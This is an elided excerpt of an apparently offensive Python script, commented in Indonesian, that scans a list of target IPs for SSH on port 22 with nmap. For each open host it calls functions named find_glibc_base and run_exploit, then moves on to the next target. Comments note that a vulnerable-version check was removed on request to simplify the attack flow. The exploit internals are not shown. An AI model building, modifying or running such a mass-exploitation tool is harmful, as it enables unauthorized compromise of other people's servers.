...
# MODIFIKASI: Daftar versi rentan dihapus sesuai permintaan.
...
class ProgressIndicator:
    ...
    def _draw_bar(self):
        ...
        while not self._stop_event.is_set():
            ...
            percentage_remaining = (remaining / self._timeout) * 100 if self._timeout > 0 else 0
...
# MODIFIKASI: Fungsi diubah namanya dan disederhanakan untuk hanya memeriksa port 22
def is_ssh_on_port_22_open(target_ip):
    """
    Memeriksa apakah port 22 terbuka dan menjalankan layanan SSH menggunakan nmap.
    """
    nmap_timeout = 30
    message = f"{BLUE}[*] Mengecek port 22 pada {target_ip}...{RESET}"
    
    progress = ProgressIndicator(message, timeout=nmap_timeout)
    
    try:
        command = ["nmap", "-p", "22", "-sV", "-Pn", "-T4", "--open", target_ip]
        
        progress.start()
        result = subprocess.run(command, capture_output=True, text=True, timeout=nmap_timeout)
        progress.stop()

        # Hanya periksa apakah port 22 terdeteksi sebagai layanan ssh yang terbuka
        if "22/tcp open  ssh" in result.stdout:
            print(f"{GREEN}[+] Port 22 terbuka dan menjalankan layanan SSH.{RESET}")
            return True
        else:
            print(f"{RED}[-] Port 22 tertutup atau bukan layanan SSH.{RESET}")
            return False
...
def main():
    ...
    for i, target_ip in enumerate(targets_to_scan):
        ...
        # MODIFIKASI: Alur disederhanakan. Panggil fungsi pengecekan port 22.
        if is_ssh_on_port_22_open(target_ip):
            # Jika port 22 terbuka, langsung coba cari GLIBC base
            port_to_scan = 22
            print(f"{GREEN}[+] Port 22 terbuka, melanjutkan dengan pencarian GLIBC base...{RESET}")
            
            glibc_base = find_glibc_base(target_ip, port_to_scan)
            ...
            if glibc_base:
                ...
                # Jika exploit berhasil, run_exploit akan mengembalikan True
                # Kita bisa lanjut ke IP berikutnya
                if run_exploit(target_ip, port_to_scan, glibc_base):
                    continue
            else:
                print(f"{YELLOW}    [-] Gagal menemukan GLIBC base pada {target_ip}:{port_to_scan}.{RESET}")
        else:
            # Jika port 22 tidak terbuka, lanjut ke target berikutnya
            print(f"{YELLOW}[-] Melewati target {target_ip} karena port 22 tidak dapat diakses.{RESET}")
            continue
